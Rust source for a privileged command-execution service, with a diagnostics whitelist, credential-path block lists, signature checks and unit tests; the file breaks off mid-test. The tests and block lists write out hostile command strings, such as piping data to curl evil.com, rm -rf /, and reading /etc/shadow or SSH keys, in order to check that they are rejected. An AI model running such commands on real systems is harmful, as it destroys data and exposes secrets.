//! Aegis Executor — Privilege-Separated System Command Execution Service
//!
//! Endpoints:
//! - GET|POST /api/v1/diagnostics — Read-only system probes (whitelist-gated)
//! - POST /api/v1/execute — Submit mutating commands (Ed25519-signed, returns job_id)
//! - GET  /api/v1/jobs/:id — Poll job status and output
//! - POST /api/v1/jobs/:id/cancel — Cancel a running job
//!
//! SECURITY: This service runs with elevated privileges (sudo/root).
//! It MUST be deployed on the same host as Aegis Runtime, listening only on localhost.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use axum::{
    Json, Router,
    extract::{Path, Query, State},
    http::StatusCode,
    routing::{get, post},
};
use ed25519_dalek::{Signature, Verifier, VerifyingKey};
use serde::{Deserialize, Serialize};
use tokio::sync::RwLock;

/// Maximum allowed timestamp drift for replay protection (5 minutes).
const MAX_TIMESTAMP_DRIFT_SECS: u64 = 300;

/// Maximum command output length (1 MB).
const MAX_OUTPUT_BYTES: usize = 1_048_576;

/// Maximum number of commands in a single execute request.
const MAX_COMMANDS: usize = 20;

/// Maximum command length.
const MAX_COMMAND_LEN: usize = 4096;

/// Maximum time a diagnostic command can run before being killed (30 seconds).
const DIAGNOSTIC_TIMEOUT: Duration = Duration::from_secs(30);
/// Upper bound a caller may request for a diagnostic command.
const MAX_DIAGNOSTIC_TIMEOUT_SECS: u64 = 180;

/// Effective timeout for one diagnostic command: the caller's request clamped
/// to 1..=180 s, the 30 s default when absent.
fn diagnostic_timeout(requested: Option<u64>) -> Duration {
    match requested {
        Some(secs) => Duration::from_secs(secs.clamp(1, MAX_DIAGNOSTIC_TIMEOUT_SECS)),
        None => DIAGNOSTIC_TIMEOUT,
    }
}

/// Default per-command timeout for mutating commands (10 minutes).
const DEFAULT_EXECUTE_TIMEOUT_SECS: u64 = 600;

/// Absolute maximum per-command timeout (30 minutes).
const MAX_EXECUTE_TIMEOUT_SECS: u64 = 1800;

/// Maximum concurrent jobs.
const MAX_CONCURRENT_JOBS: usize = 4;

/// Jobs are cleaned up after this duration (1 hour).
const JOB_TTL_SECS: u64 = 3600;

/// Hardcoded whitelist of safe diagnostic commands (no side effects).
const DIAGNOSTIC_WHITELIST: &[&str] = &[
    "uname",
    "hostname",
    "whoami",
    "id",
    "uptime",
    "cat",
    "ls",
    "df",
    "du",
    "free",
    "top",
    "dpkg",
    "systemctl", // read-only subcommands only (SYSTEMCTL_READ_ONLY)
    "which",
    "lsb_release",
    "ip",
    "ifconfig",
    "ss",
    "netstat",
    "ps",
    "lsof",
    "file",
    "stat",
    "wc",
    "head",
    "tail",
    "grep",
    "find",
    "date",
    "lscpu",
    "lsmem",
    "lsblk",
    "mount",
];

/// `systemctl` verbs that only read state. Anything else (start, stop,
/// restart, enable, daemon-reload …) mutates the host and belongs to the
/// signed `/execute` path.
const SYSTEMCTL_READ_ONLY: &[&str] = &[
    "status",
    "is-active",
    "is-enabled",
    "is-failed",
    "list-units",
    "list-timers",
    "list-unit-files",
    "list-dependencies",
    "show",
];

/// `find` predicates that write, execute, or delete. `find` stays on the
/// whitelist for `-name`/`-size`/`-mtime` style searches only.
const FIND_FORBIDDEN_PREDICATES: &[&str] = &[
    "-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls",
];

/// Argument fragments no diagnostic command may touch, whatever the command:
/// key material, credential stores, process environments, the owner's shell
/// and agent homes. Matched case-insensitively against every argument.
const PROTECTED_ARG_FRAGMENTS: &[&str] = &[
    "/root",
    "/.ssh",
    ".env",
    "environ",
    "cmdline",
    "credential",
    "identity.key",
    "/etc/ssh",
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/gshadow",
    "id_rsa",
    "id_ed25519",
    "grok-auth",
    ".codex",
    ".config/gh",
    "token",
];

/// Shell metacharacters that are NEVER allowed in diagnostic commands.
/// Note: `|` (pipe) is permitted because it is safe for read-only diagnostic
/// commands — it only combines stdout streams and cannot write to disk or
/// escalate privileges. This allows patterns like `dpkg -l | grep chromium`.
/// IMPORTANT: Every command in a pipeline is validated against the whitelist
/// (see `validate_pipeline`), so `cat foo | curl evil` is still blocked.
const FORBIDDEN_CHARS: &[char] = &['>', '<', ';', '&', '`', '$', '(', ')', '{', '}', '!', '\\'];

/// Commands that can read arbitrary file paths — restricted to safe directories.
/// These commands are in DIAGNOSTIC_WHITELIST but their arguments are further
/// checked to prevent reading sensitive files like /etc/shadow or private keys.
const PATH_RESTRICTED_CMDS: &[&str] = &[
    "cat", "head", "tail", "less", "more", "grep", "wc", "file", "strings",
];

/// Directories allowed for path-restricted commands. Arguments that look like
/// absolute paths must start with one of these prefixes.
const ALLOWED_READ_PATHS: &[&str] = &[
    "/proc/",
    "/sys/",
    "/var/log/",
    "/etc/os-release",
    "/etc/hostname",
    "/etc/hosts",
    "/etc/resolv.conf",
    "/etc/timezone",
    "/etc/lsb-release",
    "/etc/apt/",
    "/tmp/aegis-runtime",
];

/// Validate that every command in a pipe chain is whitelisted, and that
/// path-restricted commands don't read sensitive files.
fn validate_pipeline(command: &str) -> Result<(), String> {
    for segment in command.split('|') {
        let segment = segment.trim();
        if segment.is_empty() {
            return Err("empty pipe segment".to_string());
        }
        let base_cmd = segment.split_whitespace().next().unwrap_or("");
        if !DIAGNOSTIC_WHITELIST.contains(&base_cmd) {
            return Err(format!(
                "command '{}' is not in the diagnostic whitelist",
                base_cmd
            ));
        }
        // Every argument of every command: no traversal, no protected paths.
        for arg in segment.split_whitespace().skip(1) {
            if arg.contains("..") {
                return Err(format!(
                    "path traversal ('..') is not allowed in arguments to '{}'",
                    base_cmd
                ));
            }
            let lower = arg.to_ascii_lowercase();
            if let Some(fragment) = PROTECTED_ARG_FRAGMENTS
                .iter()
                .find(|fragment| lower.contains(*fragment))
            {
                return Err(format!(
                    "argument '{}' touches a protected path ({})",
                    arg, fragment
                ));
            }
        }
        if base_cmd == "systemctl" {
            let verb = segment
                .split_whitespace()
                .skip(1)
                .find(|arg| !arg.starts_with('-'))
                .unwrap_or("");
            if !SYSTEMCTL_READ_ONLY.contains(&verb) {
                return Err(format!(
                    "systemctl verb '{}' is not read-only (allowed: {})",
                    verb,
                    SYSTEMCTL_READ_ONLY.join(", ")
                ));
            }
        }
        if base_cmd == "find" {
            for arg in segment.split_whitespace().skip(1) {
                let lower = arg.to_ascii_lowercase();
                if FIND_FORBIDDEN_PREDICATES.contains(&lower.as_str()) {
                    return Err(format!("find predicate '{}' is not read-only", arg));
                }
            }
        }
        // For path-restricted commands, check that file arguments are safe
        if PATH_RESTRICTED_CMDS.contains(&base_cmd) {
            for arg in segment.split_whitespace().skip(1) {
                // Skip flags (e.g. -n 10)
                if arg.starts_with('-') {
                    continue;
                }
                // Absolute paths must be in the allowed list
                if arg.starts_with('/') {
                    // Block procfs symlink traversal (/proc/self/root/etc/shadow)
                    if arg.starts_with("/proc/") && arg.contains("/root/") {
                        return Err(format!("path '{}' uses procfs symlink traversal", arg));
                    }
                    let allowed = ALLOWED_READ_PATHS
                        .iter()
                        .any(|prefix| arg.starts_with(prefix));
                    if !allowed {
                        return Err(format!(
                            "path '{}' is not in the allowed read paths for '{}'",
                            arg, base_cmd
                        ));
                    }
                }
                // Block path traversal (../../../etc/shadow)
                if arg.contains("..") {
                    return Err(format!(
                        "path traversal ('..') is not allowed in arguments to '{}'",
                        base_cmd
                    ));
                }
            }
        }
    }
    Ok(())
}

// -- Job system ---------------------------------------------------------------

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
enum JobStatus {
    Running,
    Completed,
    Failed,
    TimedOut,
    Cancelled,
}

#[derive(Clone, Serialize)]
struct CommandResult {
    command: String,
    exit_code: Option<i32>,
    stdout: String,
    stderr: String,
}

struct Job {
    id: String,
    commands: Vec<String>,
    status: JobStatus,
    results: Vec<CommandResult>,
    current_command_index: usize,
    started_at: u64,
    finished_at: Option<u64>,
    timeout_secs: u64,
}

type JobStore = Arc<RwLock<HashMap<String, Arc<RwLock<Job>>>>>;
type AbortStore = Arc<tokio::sync::Mutex<HashMap<String, tokio::task::AbortHandle>>>;

/// Application state shared across handlers.
struct AppState {
    /// Shared bearer token for the read-only endpoints (diagnostics, job
    /// status, cancel). `None` = not configured → those endpoints refuse
    /// every request (fail closed). The signed `/execute` path is unchanged.
    diag_token: Option<String>,
    /// Signatures accepted by `/execute` within the drift window: a replayed
    /// envelope is rejected instead of running its commands again.
    seen_signatures: tokio::sync::Mutex<HashMap<String, u64>>,
    /// Aegis Runtime's Ed25519 public key for signature verification.
    verifying_key: Option<VerifyingKey>,
    jobs: JobStore,
    abort_handles: AbortStore,
}

// -- Request / Response types -------------------------------------------------

#[derive(Deserialize)]
struct DiagnosticRequest {
    command: String,
    /// Optional per-command timeout in seconds (default 30, max 180). Lets a
    /// bounded but slow read-only probe such as `du` over the data trees
    /// finish (host alert enrichment, 2026-09-12).
    #[serde(default)]
    timeout_secs: Option<u64>,
}

#[derive(Serialize)]
struct DiagnosticResponse {
    status: String,
    output: String,
    exit_code: Option<i32>,
}

#[derive(Deserialize)]
struct ExecuteRequest {
    commands: Vec<String>,
    /// Hex-encoded Ed25519 signature over: "{timestamp}:{cmd1}\n{cmd2}\n..."
    signature: String,
    /// Unix timestamp (seconds)
    timestamp: u64,
    /// Optional per-command timeout in seconds (default: 600, max: 1800).
    #[serde(default)]
    timeout_secs: Option<u64>,
}

#[derive(Serialize)]
struct ExecuteSubmitResponse {
    status: String,
    job_id: String,
}

#[derive(Serialize)]
struct JobStatusResponse {
    job_id: String,
    status: JobStatus,
    commands_total: usize,
    commands_completed: usize,
    current_command: Option<String>,
    results: Vec<CommandResult>,
    elapsed_secs: u64,
    timeout_secs: u64,
}

#[derive(Serialize)]
struct JobCancelResponse {
    status: String,
    job_id: String,
}

// -- Handlers -----------------------------------------------------------------

/// Constant-time comparison of the presented bearer token with the configured one.
fn bearer_token_matches(configured: &str, header: Option<&axum::http::HeaderValue>) -> bool {
    let Some(value) = header.and_then(|h| h.to_str().ok()) else {
        return false;
    };
    let Some(presented) = value.strip_prefix("Bearer ").map(str::trim) else {
        return false;
    };
    let a = configured.as_bytes();
    let b = presented.as_bytes();
    if a.len() != b.len() {
        return false;
    }
    a.iter().zip(b).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}

/// Gate for the read-only endpoints: 503 when no token is configured (fail
/// closed), 401 when the caller's bearer token is missing or wrong.
fn require_diag_token(
    state: &AppState,
    headers: &axum::http::HeaderMap,
) -> Result<(), (StatusCode, &'static str)> {
    let Some(token) = state.diag_token.as_deref() else {
        return Err((
            StatusCode::SERVICE_UNAVAILABLE,
            "executor token not configured (AEGIS_EXECUTOR_TOKEN)",
        ));
    };
    if bearer_token_matches(token, headers.get(axum::http::header::AUTHORIZATION)) {
        Ok(())
    } else {
        Err((
            StatusCode::UNAUTHORIZED,
            "missing or invalid executor token",
        ))
    }
}

/// POST /api/v1/diagnostics — Execute read-only diagnostic commands.
async fn handle_diagnostics(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(req): Json<DiagnosticRequest>,
) -> Result<Json<DiagnosticResponse>, (StatusCode, Json<DiagnosticResponse>)> {
    if let Err((status, reason)) = require_diag_token(&state, &headers) {
        return Err((
            status,
            Json(DiagnosticResponse {
                status: "error".into(),
                output: reason.into(),
                exit_code: None,
            }),
        ));
    }

    // Validate command
    let command = req.command.trim();
    if command.is_empty() || command.len() > MAX_COMMAND_LEN {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(DiagnosticResponse {
                status: "error".into(),
                output: "command is empty or too long".into(),
                exit_code: None,
            }),
        ));
    }

    // Check for forbidden shell metacharacters
    if command.chars().any(|c| FORBIDDEN_CHARS.contains(&c)) {
        return Err((
            StatusCode::FORBIDDEN,
            Json(DiagnosticResponse {
                status: "error".into(),
                output: "command contains forbidden shell metacharacters".into(),
                exit_code: None,
            }),
        ));
    }

    // Validate every command in the pipeline is whitelisted, and path-restricted
    // commands only read allowed directories.
    if let Err(reason) = validate_pipeline(command) {
        return Err((
            StatusCode::FORBIDDEN,
            Json(DiagnosticResponse {
                status: "error".into(),
                output: reason,
                exit_code: None,
            }),
        ));
    }

    // Execute via /bin/sh -c (safe because metacharacters are blocked)
    let result = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(command)
        .output();

    let timeout = diagnostic_timeout(req.timeout_secs);
    match tokio::time::timeout(timeout, result).await {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let mut combined = stdout.to_string();
            if !stderr.is_empty() {
                combined.push_str("\n[stderr] ");
                combined.push_str(&stderr);
            }
            if combined.len() > MAX_OUTPUT_BYTES {
                combined.truncate(MAX_OUTPUT_BYTES);
                combined.push_str("\n...(truncated)");
            }
            Ok(Json(DiagnosticResponse {
                status: "ok".into(),
                output: combined,
                exit_code: output.status.code(),
            }))
        }
        Ok(Err(e)) => Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(DiagnosticResponse {
                status: "error".into(),
                output: format!("execution failed: {}", e),
                exit_code: None,
            }),
        )),
        Err(_) => Err((
            StatusCode::GATEWAY_TIMEOUT,
            Json(DiagnosticResponse {
                status: "error".into(),
                output: format!("command timed out after {} seconds", timeout.as_secs()),
                exit_code: None,
            }),
        )),
    }
}

/// Query parameters for GET /api/v1/diagnostics.
#[derive(Deserialize)]
struct DiagnosticQuery {
    command: String,
    timeout_secs: Option<u64>,
}

/// GET /api/v1/diagnostics?command=... — Same as POST but via query parameter.
/// Used by Wasm skills whose sandbox only supports GET (host_fetch).
async fn handle_diagnostics_get(
    state: State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Query(query): Query<DiagnosticQuery>,
) -> Result<Json<DiagnosticResponse>, (StatusCode, Json<DiagnosticResponse>)> {
    handle_diagnostics(
        state,
        headers,
        Json(DiagnosticRequest {
            command: query.command,
            timeout_secs: query.timeout_secs,
        }),
    )
    .await
}

/// Validate and authenticate an execute request. Returns parsed commands on success.
fn validate_execute_request(
    state: &AppState,
    req: &ExecuteRequest,
) -> Result<(), (StatusCode, Json<ExecuteSubmitResponse>)> {
    let err = |msg: &str| {
        (
            StatusCode::FORBIDDEN,
            Json(ExecuteSubmitResponse {
                status: msg.to_string(),
                job_id: String::new(),
            }),
        )
    };

    if req.commands.is_empty() || req.commands.len() > MAX_COMMANDS {
        return Err(err("invalid command count (0 or exceeds limit)"));
    }

    for cmd in &req.commands {
        if cmd.len() > MAX_COMMAND_LEN {
            return Err(err("command exceeds maximum length"));
        }
    }

    // Replay protection
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let drift = now.abs_diff(req.timestamp);
    if drift > MAX_TIMESTAMP_DRIFT_SECS {
        return Err(err("timestamp drift exceeds 5 minutes (replay protection)"));
    }

    // Verify Ed25519 signature
    let verifying_key = match &state.verifying_key {
        Some(k) => k,
        None => return Err(err("executor not configured with verifying key")),
    };

    let signed_message = format!("{}:{}", req.timestamp, req.commands.join("\n"));

    let sig_bytes = match hex::decode(&req.signature) {
        Ok(b) => b,
        Err(_) => return Err(err("invalid signature encoding")),
    };

    let signature = match Signature::from_slice(&sig_bytes) {
        Ok(s) => s,
        Err(_) => return Err(err("invalid signature format")),
    };

    if verifying_key
        .verify(signed_message.as_bytes(), &signature)
        .is_err()
    {
        return Err(err("signature verification failed"));
    }

    Ok(())
}

/// POST /api/v1/execute — Submit mutating commands for async execution.
/// Returns 202 Accepted with a job_id. Poll GET /api/v1/jobs/:id for status.
async fn handle_execute(
    State(state): State<Arc<AppState>>,
    Json(req): Json<ExecuteRequest>,
) -> Result<(StatusCode, Json<ExecuteSubmitResponse>), (StatusCode, Json<ExecuteSubmitResponse>)> {
    validate_execute_request(&state, &req)?;
    {
        // Replay guard: the same signed envelope must not run twice inside the
        // drift window (the timestamp alone allowed five minutes of replays).
        let now = now_secs();
        let mut seen = state.seen_signatures.lock().await;
        seen.retain(|_, expires| *expires > now);
        if seen.contains_key(&req.signature) {
            return Err((
                StatusCode::CONFLICT,
                Json(ExecuteSubmitResponse {
                    status: "error: signature already used (replay rejected)".into(),
                    job_id: String::new(),
                }),
            ));
        }
        seen.insert(req.signature.clone(), now + MAX_TIMESTAMP_DRIFT_SECS * 2);
    }

    // Check concurrent job limit
    {
        let jobs = state.jobs.read().await;
        let running = jobs
            .values()
            .filter(|j| {
                // We can't await inside filter, so we use try_read
                j.try_read()
                    .map(|j| j.status == JobStatus::Running)
                    .unwrap_or(true) // conservative: count locked jobs as running
            })
            .count();
        if running >= MAX_CONCURRENT_JOBS {
            return Err((
                StatusCode::TOO_MANY_REQUESTS,
                Json(ExecuteSubmitResponse {
                    status: format!("too many concurrent jobs (limit: {})", MAX_CONCURRENT_JOBS),
                    job_id: String::new(),
                }),
            ));
        }
    }

    let timeout_secs = req
        .timeout_secs
        .unwrap_or(DEFAULT_EXECUTE_TIMEOUT_SECS)
        .min(MAX_EXECUTE_TIMEOUT_SECS);

    let now_secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    // Generate job ID: hex-encoded 16 random bytes
    let job_id = generate_job_id();

    let job = Arc::new(RwLock::new(Job {
        id: job_id.clone(),
        commands: req.commands.clone(),
        status: JobStatus::Running,
        results: Vec::new(),
        current_command_index: 0,
        started_at: now_secs,
        finished_at: None,
        timeout_secs,
    }));

    // Insert into store
    state.jobs.write().await.insert(job_id.clone(), job.clone());

    let commands_count = req.commands.len();

    // Spawn background execution task
    let job_clone = job.clone();
    let commands = req.commands;
    let handle = tokio::spawn(async move {
        execute_job(job_clone, commands, timeout_secs).await;
    });

    // Store abort handle for cancellation
    state
        .abort_handles
        .lock()
        .await
        .insert(job_id.clone(), handle.abort_handle());

    tracing::info!(job_id = %job_id, commands_count,
        timeout_secs, "Job submitted for async execution");

    Ok((
        StatusCode::ACCEPTED,
        Json(ExecuteSubmitResponse {
            status: "accepted".into(),
            job_id,
        }),
    ))
}

/// Execute commands sequentially in background, updating the Job in place.
async fn execute_job(job: Arc<RwLock<Job>>, commands: Vec<String>, timeout_secs: u64) {
    let timeout = Duration::from_secs(timeout_secs);

    for (idx, cmd) in commands.iter().enumerate() {
        // Update current command index
        {
            let mut j = job.write().await;
            j.current_command_index = idx;
        }

        tracing::info!(command = %cmd, index = idx, "Executing approved command");

        let child = match tokio::process::Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .kill_on_drop(true)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
        {
            Ok(c) => c,
            Err(e) => {
                let mut j = job.write().await;
                j.results.push(CommandResult {
                    command: cmd.clone(),
                    exit_code: None,
                    stdout: String::new(),
                    stderr: format!("spawn error: {}", e),
                });
                j.status = JobStatus::Failed;
                j.finished_at = Some(now_secs());
                return;
            }
        };

        match tokio::time::timeout(timeout, child.wait_with_output()).await {
            Ok(Ok(o)) => {
                let mut stdout = String::from_utf8_lossy(&o.stdout).to_string();
                let mut stderr = String::from_utf8_lossy(&o.stderr).to_string();
                if stdout.len() > MAX_OUTPUT_BYTES {
                    stdout.truncate(MAX_OUTPUT_BYTES);
                }
                if stderr.len() > MAX_OUTPUT_BYTES {
                    stderr.truncate(MAX_OUTPUT_BYTES);
                }
                let exit_code = o.status.code();

                let mut j = job.write().await;
                j.results.push(CommandResult {
                    command: cmd.clone(),
                    exit_code,
                    stdout,
                    stderr,
                });

                if exit_code != Some(0) {
                    tracing::warn!(command = %cmd, exit_code = ?exit_code,
                        "Command failed, stopping batch");
                    j.status = JobStatus::Failed;
                    j.finished_at = Some(now_secs());
                    return;
                }
            }
            Ok(Err(e)) => {
                let mut j = job.write().await;
                j.results.push(CommandResult {
                    command: cmd.clone(),
                    exit_code: None,
                    stdout: String::new(),
                    stderr: format!("execution error: {}", e),
                });
                j.status = JobStatus::Failed;
                j.finished_at = Some(now_secs());
                return;
            }
            Err(_) => {
                tracing::warn!(command = %cmd, "Command timed out after {}s", timeout_secs);
                // child is dropped here → kill_on_drop kills it
                let mut j = job.write().await;
                j.results.push(CommandResult {
                    command: cmd.clone(),
                    exit_code: None,
                    stdout: String::new(),
                    stderr: format!("command timed out after {} seconds", timeout_secs),
                });
                j.status = JobStatus::TimedOut;
                j.finished_at = Some(now_secs());
                return;
            }
        }
    }

    // All commands succeeded
    let mut j = job.write().await;
    j.status = JobStatus::Completed;
    j.finished_at = Some(now_secs());
    tracing::info!(job_id = %j.id, "Job completed successfully");
}

/// GET /api/v1/jobs/:id — Poll job status and results.
async fn handle_job_status(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Path(job_id): Path<String>,
) -> Result<Json<JobStatusResponse>, StatusCode> {
    require_diag_token(&state, &headers).map_err(|(status, _)| status)?;
    let jobs = state.jobs.read().await;
    let job_arc = jobs.get(&job_id).ok_or(StatusCode::NOT_FOUND)?;
    let job = job_arc.read().await;

    let now = now_secs();
    let elapsed = now.saturating_sub(job.started_at);

    let current_command = if job.status == JobStatus::Running {
        job.commands.get(job.current_command_index).cloned()
    } else {
        None
    };

    Ok(Json(JobStatusResponse {
        job_id: job.id.clone(),
        status: job.status,
        commands_total: job.commands.len(),
        commands_completed: job.results.len(),
        current_command,
        results: job.results.clone(),
        elapsed_secs: elapsed,
        timeout_secs: job.timeout_secs,
    }))
}

/// POST /api/v1/jobs/:id/cancel — Cancel a running job.
async fn handle_job_cancel(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Path(job_id): Path<String>,
) -> Result<Json<JobCancelResponse>, (StatusCode, Json<JobCancelResponse>)> {
    let err = |msg: &str| {
        (
            StatusCode::BAD_REQUEST,
            Json(JobCancelResponse {
                status: msg.to_string(),
                job_id: job_id.clone(),
            }),
        )
    };
    if let Err((status, reason)) = require_diag_token(&state, &headers) {
        return Err((
            status,
            Json(JobCancelResponse {
                status: reason.to_string(),
                job_id: job_id.clone(),
            }),
        ));
    }

    // Check job exists and is running
    {
        let jobs = state.jobs.read().await;
        let job_arc = match jobs.get(&job_id) {
            Some(j) => j,
            None => return Err(err("job not found")),
        };
        let job = job_arc.read().await;
        if job.status != JobStatus::Running {
            return Err(err(&format!(
                "job is not running (status: {:?})",
                job.status
            )));
        }
    }

    // Abort the task (kill_on_drop will kill the child process)
    if let Some(handle) = state.abort_handles.lock().await.remove(&job_id) {
        handle.abort();
    }

    // Update job status
    let jobs = state.jobs.read().await;
    if let Some(job_arc) = jobs.get(&job_id) {
        let mut job = job_arc.write().await;
        job.status = JobStatus::Cancelled;
        job.finished_at = Some(now_secs());
    }

    tracing::info!(job_id = %job_id, "Job cancelled by request");

    Ok(Json(JobCancelResponse {
        status: "cancelled".into(),
        job_id,
    }))
}

/// Health check endpoint.
async fn health() -> &'static str {
    "aegis-executor ok"
}

/// Background task: clean up finished jobs older than JOB_TTL_SECS.
async fn job_cleanup_loop(jobs: JobStore, abort_handles: AbortStore) {
    loop {
        tokio::time::sleep(Duration::from_secs(300)).await; // every 5 minutes

        let now = now_secs();
        let mut to_remove = Vec::new();

        {
            let store = jobs.read().await;
            for (id, job_arc) in store.iter() {
                if let Ok(job) = job_arc.try_read()
                    && job.status != JobStatus::Running
                    && let Some(finished) = job.finished_at
                    && now.saturating_sub(finished) > JOB_TTL_SECS
                {
                    to_remove.push(id.clone());
                }
            }
        }

        if !to_remove.is_empty() {
            let mut store = jobs.write().await;
            let mut handles = abort_handles.lock().await;
            for id in &to_remove {
                store.remove(id);
                handles.remove(id);
            }
            tracing::info!(count = to_remove.len(), "Cleaned up expired jobs");
        }
    }
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn generate_job_id() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    // Use two RandomState hashers for 128 bits of entropy
    let s1 = RandomState::new();
    let s2 = RandomState::new();
    let h1 = s1.build_hasher().finish();
    let h2 = s2.build_hasher().finish();
    format!("{:016x}{:016x}", h1, h2)
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();

    // Load Aegis Runtime's public key from environment
    let pubkey_hex = std::env::var("AEGIS_PUBKEY_HEX").ok();
    let verifying_key = pubkey_hex.and_then(|hex_str| {
        let bytes = hex::decode(&hex_str).ok()?;
        let bytes: [u8; 32] = bytes.try_into().ok()?;
        VerifyingKey::from_bytes(&bytes).ok()
    });

    if verifying_key.is_some() {
        tracing::info!("Loaded Aegis Runtime Ed25519 public key for signature verification");
    } else {
        tracing::warn!("No AEGIS_PUBKEY_HEX set — /execute endpoint will reject all requests");
    }

    let jobs: JobStore = Arc::new(RwLock::new(HashMap::new()));
    let abort_handles: AbortStore = Arc::new(tokio::sync::Mutex::new(HashMap::new()));

    // Spawn cleanup task
    tokio::spawn(job_cleanup_loop(jobs.clone(), abort_handles.clone()));

    let diag_token = std::env::var("AEGIS_EXECUTOR_TOKEN")
        .ok()
        .map(|t| t.trim().to_string())
        .filter(|t| !t.is_empty());
    if diag_token.is_some() {
        tracing::info!("Diagnostics endpoints require the shared executor token");
    } else {
        tracing::warn!(
            "No AEGIS_EXECUTOR_TOKEN set — diagnostics/job endpoints will refuse all requests"
        );
    }
    // Relative paths in diagnostic commands resolve inside an empty directory,
    // never the service's own working tree.
    let scratch = std::path::Path::new("/run/aegis-executor");
    if std::fs::create_dir_all(scratch).is_ok() {
        let _ = std::env::set_current_dir(scratch);
    }

    let state = Arc::new(AppState {
        diag_token,
        seen_signatures: tokio::sync::Mutex::new(HashMap::new()),
        verifying_key,
        jobs,
        abort_handles,
    });

    let app = Router::new()
        .route("/health", axum::routing::get(health))
        .route(
            "/api/v1/diagnostics",
            get(handle_diagnostics_get).post(handle_diagnostics),
        )
        .route("/api/v1/execute", post(handle_execute))
        .route("/api/v1/jobs/{id}", get(handle_job_status))
        .route("/api/v1/jobs/{id}/cancel", post(handle_job_cancel))
        .with_state(state);

    let bind_addr = std::env::var("EXECUTOR_BIND").unwrap_or_else(|_| "127.0.0.1:9876".to_string());

    tracing::info!("Aegis Executor listening on {}", bind_addr);

    let listener = tokio::net::TcpListener::bind(&bind_addr)
        .await
        .expect("failed to bind");

    axum::serve(listener, app).await.expect("server failed");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn diagnostic_timeout_is_clamped() {
        assert_eq!(diagnostic_timeout(None), Duration::from_secs(30));
        assert_eq!(diagnostic_timeout(Some(0)), Duration::from_secs(1));
        assert_eq!(diagnostic_timeout(Some(120)), Duration::from_secs(120));
        assert_eq!(diagnostic_timeout(Some(10_000)), Duration::from_secs(180));
    }

    #[test]
    fn diagnostic_whitelist_contains_basics() {
        assert!(DIAGNOSTIC_WHITELIST.contains(&"uname"));
        assert!(DIAGNOSTIC_WHITELIST.contains(&"cat"));
        assert!(DIAGNOSTIC_WHITELIST.contains(&"dpkg"));
        assert!(DIAGNOSTIC_WHITELIST.contains(&"ls"));
    }

    #[test]
    fn forbidden_chars_blocks_injection() {
        let cmd = "cat /etc/passwd; rm -rf /";
        assert!(cmd.chars().any(|c| FORBIDDEN_CHARS.contains(&c)));
        let cmd2 = "uname > /tmp/pwned";
        assert!(cmd2.chars().any(|c| FORBIDDEN_CHARS.contains(&c)));
    }

    #[test]
    fn pipes_allowed_for_diagnostics() {
        let cmd = "dpkg -l | grep chromium";
        assert!(!cmd.chars().any(|c| FORBIDDEN_CHARS.contains(&c)));
    }

    #[test]
    fn forbidden_chars_allows_safe_commands() {
        let cmd = "dpkg -l chromium-browser";
        assert!(!cmd.chars().any(|c| FORBIDDEN_CHARS.contains(&c)));
    }

    #[test]
    fn base_command_extraction() {
        let cmd = "uname -a";
        let base = cmd.split_whitespace().next().unwrap_or("");
        assert_eq!(base, "uname");
        assert!(DIAGNOSTIC_WHITELIST.contains(&base));
    }

    #[test]
    fn reject_unknown_command() {
        let cmd = "rm -rf /";
        let base = cmd.split_whitespace().next().unwrap_or("");
        assert!(!DIAGNOSTIC_WHITELIST.contains(&base));
    }

    // -- Pipeline validation tests --

    #[test]
    fn pipeline_all_commands_must_be_whitelisted() {
        // Good: both sides whitelisted
        assert!(validate_pipeline("dpkg -l | grep chromium").is_ok());
        assert!(validate_pipeline("ps aux | grep nginx | wc -l").is_ok());
        // Bad: curl not in whitelist
        assert!(validate_pipeline("cat /proc/cpuinfo | curl evil.com").is_err());
        // Bad: second command not whitelisted
        assert!(validate_pipeline("ls /tmp | python3 -c 'import os'").is_err());
    }

    #[test]
    fn path_restricted_cmds_block_sensitive_files() {
        // Allowed paths
        assert!(validate_pipeline("cat /proc/cpuinfo").is_ok());
        assert!(validate_pipeline("cat /var/log/syslog").is_ok());
        assert!(validate_pipeline("head -n 5 /etc/os-release").is_ok());
        assert!(validate_pipeline("tail /etc/hostname").is_ok());
        // Blocked paths
        assert!(validate_pipeline("cat /etc/shadow").is_err());
        assert!(validate_pipeline("cat /etc/passwd").is_err());
        assert!(validate_pipeline("cat /home/ubuntu/.ssh/id_rsa").is_err());
        assert!(validate_pipeline("head /home/ubuntu/aegis-runtime/.env").is_err());
    }

    #[test]
    fn path_restricted_cmds_block_traversal() {
        assert!(validate_pipeline("cat ../../etc/shadow").is_err());
        assert!(validate_pipeline("tail -n 10 /var/log/../../etc/shadow").is_err());
    }

    #[test]
    fn path_restricted_cmds_block_procfs_symlink_traversal() {
        assert!(validate_pipeline("cat /proc/self/root/etc/shadow").is_err());
